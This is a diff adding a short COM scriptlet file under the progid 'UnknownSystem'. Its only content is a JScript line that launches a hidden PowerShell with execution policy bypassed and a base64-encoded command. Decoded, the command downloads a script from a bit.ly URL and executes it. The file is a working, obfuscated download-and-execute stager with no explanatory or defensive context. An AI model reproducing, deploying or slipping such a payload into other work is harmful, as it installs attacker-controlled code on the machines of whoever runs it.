@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+   progid="UnknownSystem"
+   classid="{AAAA1010-0101-1010-1100-FF1011F0CAFD}" >
+ 
+    <script language="JScript">
+        <![CDATA[
+
+           var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAaQB0AC4AbAB5AC8AUwB0AGEAZwBFADMAJwApADsA",0);
+
+       ]]>
+</script>
+</registration>
+</scriptlet>
